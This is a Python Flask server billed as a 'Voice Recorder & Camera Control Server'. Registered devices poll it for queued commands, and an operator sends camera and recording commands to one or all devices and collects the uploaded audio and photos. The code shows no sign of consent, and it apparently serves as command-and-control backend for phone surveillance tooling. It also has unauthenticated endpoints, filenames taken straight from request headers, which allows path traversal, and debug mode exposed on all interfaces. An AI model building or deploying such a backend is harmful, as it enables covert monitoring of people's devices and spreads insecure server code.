from flask import Flask, request, jsonify, send_from_directory, render_template
import threading
import time
import json
import os
from datetime import datetime
import uuid

app = Flask(__name__)

# Store connected devices and their status
connected_devices = {}
commands_queue = {}
uploaded_files = []

# Create uploads directory if not exists
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/')
def home():
    return render_template('index.html', 
                         current_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 
                         server_ip=get_server_ip())

def get_server_ip():
    try:
        import socket
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except:
        return "localhost"

# Photo upload endpoint
@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    try:
        print("📸 Photo upload request received")
        
        device_id = request.headers.get('X-Device-Id', 'unknown')
        filename = request.headers.get('X-File-Name', f'photo_{int(time.time())}.jpg')
        
        # Save photo file
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(file_path, 'wb') as f:
            f.write(request.data)
        
        file_size = os.path.getsize(file_path)
        
        # Store file info
        file_info = {
            'filename': filename,
            'device_id': device_id,
            'upload_time': time.time(),
            'size': file_size,
            'type': 'photo'
        }
        
        uploaded_files.append(file_info)
        
        print(f"✅ Photo uploaded: {filename} from device {device_id}, size: {file_size} bytes")
        
        return jsonify({
            'status': 'success',
            'message': 'Photo uploaded successfully',
            'filename': filename,
            'size': file_size
        })
        
    except Exception as e:
        print(f"❌ Photo upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Camera control endpoint
@app.route('/camera', methods=['POST'])
def camera_control():
    try:
        data = request.json
        command = data.get('command')
        action = data.get('action')
        
        print(f"📷 Camera command received: {command}, action: {action}")
        
        if not command:
            return jsonify({'status': 'error', 'message': 'No camera command provided'})
        
        # Send camera command to all connected devices
        sent_count = 0
        for dev_id in commands_queue:
            commands_queue[dev_id].append(command)
            sent_count += 1
        
        print(f"✅ Camera command '{command}' sent to {sent_count} devices")
        
        return jsonify({
            'status': 'success',
            'message': f'Camera command {command} sent to devices',
            'devices_count': sent_count,
            'command': command
        })
        
    except Exception as e:
        print(f"❌ Camera control error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# File upload endpoint
@app.route('/data', methods=['POST'])
def upload_file():
    try:
        print("📁 File upload request received")
        
        if 'audio_file' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
        
        file = request.files['audio_file']
        device_id = request.form.get('device_id', 'unknown')
        
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400
        
        # Generate unique filename
        file_extension = file.filename.split('.')[-1] if '.' in file.filename else '3gp'
        unique_filename = f"{device_id}_{int(time.time())}.{file_extension}"
        file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
        
        # Save file
        file.save(file_path)
        
        # Get file size
        file_size = os.path.getsize(file_path)
        
        # Store file info
        file_info = {
            'filename': unique_filename,
            'device_id': device_id,
            'upload_time': time.time(),
            'size': file_size,
            'original_name': file.filename,
            'type': 'audio'
        }
        
        uploaded_files.append(file_info)
        
        print(f"✅ File uploaded: {unique_filename} from device {device_id}, size: {file_size} bytes")
        
        return jsonify({
            'status': 'success',
            'message': 'File uploaded successfully',
            'filename': unique_filename,
            'size': file_size
        })
        
    except Exception as e:
        print(f"❌ File upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Serve uploaded files
@app.route('/file/<filename>')
def serve_file(filename):
    try:
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        if not os.path.exists(file_path):
            print(f"❌ File not found: {filename}")
            return "File not found", 404
        
        # Determine content type based on file extension
        if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
            mimetype = 'image/jpeg'
        else:
            mimetype = 'audio/3gpp'
            
        return send_from_directory(UPLOAD_FOLDER, filename, 
                                 as_attachment=False,
                                 mimetype=mimetype)
    except Exception as e:
        print(f"❌ File serve error: {e}")
        return str(e), 500

# Get uploaded files list
@app.route('/get_files', methods=['GET'])
def get_files():
    try:
        # Sort files by upload time (newest first)
        sorted_files = sorted(uploaded_files, key=lambda x: x['upload_time'], reverse=True)
        
        # Check if files actually exist on disk
        valid_files = []
        for file_info in sorted_files:
            file_path = os.path.join(UPLOAD_FOLDER, file_info['filename'])
            if os.path.exists(file_path):
                valid_files.append(file_info)
        
        return jsonify({'files': valid_files})
    except Exception as e:
        print(f"❌ Get files error: {e}")
        return jsonify({'files': []})

# Delete file endpoint
@app.route('/delete_file/<filename>', methods=['DELETE'])
def delete_file(filename):
    try:
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.exists(file_path):
            os.remove(file_path)
            # Remove from uploaded_files list
            global uploaded_files
            uploaded_files = [f for f in uploaded_files if f['filename'] != filename]
            print(f"✅ File deleted: {filename}")
            return jsonify({'status': 'success', 'message': 'File deleted'})
        else:
            return jsonify({'status': 'error', 'message': 'File not found'}), 404
    except Exception as e:
        print(f"❌ Delete file error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Device registration endpoint
@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        device_id = request.json.get('device_id')
        print(f"📱 Device registration attempt: {device_id}")
        
        if device_id:
            connected_devices[device_id] = {
                'status': 'connected',
                'last_seen': time.time(),
                'recording': False
            }
            commands_queue[device_id] = []
            print(f"✅ Device registered: {device_id}")
            return jsonify({'status': 'registered', 'device_id': device_id})
        
        return jsonify({'status': 'error', 'message': 'No device ID'})
    
    except Exception as e:
        print(f"❌ Registration error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# Device checks for commands
@app.route('/get_commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    try:
        if device_id in commands_queue:
            # Update last seen
            connected_devices[device_id]['last_seen'] = time.time()
            
            # Return pending commands
            commands = commands_queue[device_id].copy()
            commands_queue[device_id] = []  # Clear commands after sending
            
            print(f"📤 Sending {len(commands)} commands to {device_id}: {commands}")
            return jsonify({'commands': commands})
        
        print(f"❌ Device {device_id} not found")
        return jsonify({'commands': []})
    
    except Exception as e:
        print(f"❌ Get commands error: {e}")
        return jsonify({'commands': []})

# Send command to device
@app.route('/send_command', methods=['POST'])
def send_command():
    try:
        command = request.json.get('command')
        device_id = request.json.get('device_id')
        
        print(f"📨 Received command '{command}' for device '{device_id}'")
        
        if not command:
            return jsonify({'status': 'error', 'message': 'No command provided'})
        
        sent_count = 0
        if device_id:
            # Send to specific device
            if device_id in commands_queue:
                commands_queue[device_id].append(command)
                sent_count = 1
                print(f"✅ Command '{command}' sent to device '{device_id}'")
            else:
                print(f"❌ Device '{device_id}' not found")
        else:
            # Send to all connected devices
            for dev_id in commands_queue:
                commands_queue[dev_id].append(command)
                sent_count += 1
            print(f"✅ Command '{command}' sent to all {sent_count} devices")
        
        return jsonify({
            'status': 'command_sent', 
            'command': command,
            'devices_count': sent_count
        })
    
    except Exception as e:
        print(f"❌ Send command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# Update device status
@app.route('/update_status', methods=['POST'])
def update_status():
    try:
        device_id = request.json.get('device_id')
        status = request.json.get('status')
        recording = request.json.get('recording', False)
        
        print(f"📊 Device {device_id} status update: {status}, recording: {recording}")
        
        if device_id in connected_devices:
            connected_devices[device_id]['status'] = status
            connected_devices[device_id]['recording'] = recording
            connected_devices[device_id]['last_seen'] = time.time()
        
        return jsonify({'status': 'updated'})
    
    except Exception as e:
        print(f"❌ Update status error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# Get connected devices
@app.route('/get_devices', methods=['GET'])
def get_devices():
    try:
        # Clean up old devices (more than 60 seconds)
        current_time = time.time()
        expired_devices = []
        for dev_id, device_data in connected_devices.items():
            if current_time - device_data['last_seen'] > 60:
                expired_devices.append(dev_id)
        
        for dev_id in expired_devices:
            del connected_devices[dev_id]
            if dev_id in commands_queue:
                del commands_queue[dev_id]
            print(f"🗑️ Removed expired device: {dev_id}")
        
        print(f"📋 Current devices: {len(connected_devices)}")
        return jsonify({'devices': connected_devices})
    
    except Exception as e:
        print(f"❌ Get devices error: {e}")
        return jsonify({'devices': {}})

if __name__ == '__main__':
    print('🚀 Starting Voice Recorder & Camera Control Server...')
    print('📡 Web Panel: http://localhost:5000')
    print('📍 Available Endpoints:')
    print('   - GET  /')
    print('   - POST /camera (camera control)')
    print('   - POST /data (audio upload)')
    print('   - POST /upload_photo (photo upload)')
    print('   - GET  /file/<filename>')
    print('   - GET  /get_files')
    print('   - DELETE /delete_file/<filename>')
    print('   - POST /register_device')
    print('   - GET  /get_commands/<device_id>')
    print('   - POST /send_command')
    print('   - POST /update_status')
    print('   - GET  /get_devices')
    print('⏹️  Press Ctrl+C to stop')
    app.run(host='0.0.0.0', port=5000, debug=True)
